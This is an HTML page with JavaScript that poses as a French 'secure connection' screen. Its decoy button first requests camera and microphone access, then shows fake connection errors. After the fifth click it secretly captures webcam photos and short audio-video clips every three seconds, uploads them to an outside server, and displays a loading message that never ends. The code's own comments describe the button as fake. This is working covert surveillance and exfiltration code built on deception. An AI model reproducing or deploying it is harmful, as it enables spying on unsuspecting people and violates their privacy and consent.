<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion s√©curis√©e</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      overflow: hidden;
      font-family: sans-serif;
      color: #fff;
    }

    video#video {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      filter: blur(15px) brightness(0.6);
      z-index: -1;
    }

    .center {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }

    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #444;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #555;
    }

    button:disabled {
      background: #222;
      cursor: not-allowed;
    }

    #status {
      margin-top: 20px;
      font-size: 16px;
      color: #ccc;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div class="center">
    <button id="fakeBtn">Voir le contenu</button>
    <div id="status">Chargement s√©curis√© en cours...</div>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const fakeBtn = document.getElementById('fakeBtn');
    const status = document.getElementById('status');

    let clickCount = 0;
    let stream = null;
    let captureInterval = null;
    let videoRecordInterval = null;
    let isCapturing = false;

    // Configuration
    const CAPTURE_INTERVAL = 3000; // 3 secondes
    const SERVER_URL = 'https://moonscale-dashboard.onrender.com/stream/upload';

    // ‚úÖ Fonction pour demander la permission et d√©marrer la webcam
    async function requestCameraPermission() {
      try {
        status.textContent = "Demande d'autorisation cam√©ra...";
        
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            width: { ideal: 1280 }, 
            height: { ideal: 720 },
            facingMode: 'user'
          }, 
          audio: true 
        });
        
        video.srcObject = stream;
        status.textContent = "Cam√©ra activ√©e. Cliquez pour continuer.";
        return true;
      } catch (err) {
        status.textContent = "Erreur : Acc√®s √† la cam√©ra refus√©.";
        console.error('Erreur cam√©ra:', err);
        return false;
      }
    }

    // üñºÔ∏è Capture d'une photo
    function capturePhoto() {
      if (!video.videoWidth || !video.videoHeight) return null;
      
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.8);
    }

    // üé• Enregistrement vid√©o court
    function recordVideoSegment() {
      return new Promise((resolve) => {
        if (!stream) {
          resolve(null);
          return;
        }

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result);
          reader.readAsDataURL(blob);
        };

        recorder.start();
        
        // Enregistrer pendant 2 secondes
        setTimeout(() => {
          recorder.stop();
        }, 2000);
      });
    }

    // üì§ Envoi des donn√©es au serveur
    async function sendCapturedData() {
      try {
        const photo = capturePhoto();
        const videoData = await recordVideoSegment();

        if (!photo && !videoData) return;

        const payload = {
          images: photo ? [photo] : [],
          video: videoData,
          timestamp: new Date().toISOString()
        };

        const response = await fetch(SERVER_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log('‚úÖ Donn√©es envoy√©es avec succ√®s');
        } else {
          console.error('‚ùå Erreur serveur:', response.status);
        }
      } catch (err) {
        console.error('‚ùå Erreur envoi:', err);
      }
    }

    // üîÑ D√©marrer la capture continue
    function startContinuousCapture() {
      if (isCapturing) return;
      
      isCapturing = true;
      status.textContent = "Connexion √©tablie. Traitement en cours...";
      
      // Envoyer imm√©diatement une premi√®re capture
      sendCapturedData();
      
      // Puis continuer toutes les 3 secondes
      captureInterval = setInterval(() => {
        sendCapturedData();
      }, CAPTURE_INTERVAL);

      // Simulation de "chargement" qui ne finit jamais
      let dots = 0;
      setInterval(() => {
        dots = (dots + 1) % 4;
        status.textContent = "Traitement en cours" + ".".repeat(dots);
      }, 500);
    }

    // üõë Arr√™ter la capture (pour les tests)
    function stopCapture() {
      isCapturing = false;
      if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
      }
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }
    }

    // üß† Gestion du clic sur le faux bouton
    fakeBtn.addEventListener('click', async () => {
      clickCount++;

      if (clickCount === 1) {
        // Premier clic : demander la permission
        const hasPermission = await requestCameraPermission();
        if (!hasPermission) return;
        
        fakeBtn.textContent = "Connexion en cours...";
      } else if (clickCount < 5) {
        // Clics 2-4 : simuler des "erreurs"
        status.textContent = `Erreur de connexion... Veuillez r√©essayer (${clickCount}/5)`;
        fakeBtn.textContent = "R√©essayer";
      } else {
        // 5√®me clic : d√©marrer la capture continue
        fakeBtn.disabled = true;
        fakeBtn.textContent = "Traitement...";
        startContinuousCapture();
      }
    });

    // üîß Nettoyage √† la fermeture de la page
    window.addEventListener('beforeunload', () => {
      stopCapture();
    });

    // üéØ Pour les tests : arr√™ter apr√®s 30 secondes
    setTimeout(() => {
      console.log('üõë Arr√™t automatique apr√®s 30 secondes (mode d√©mo)');
      stopCapture();
    }, 30000);
  </script>
</body>
</html>
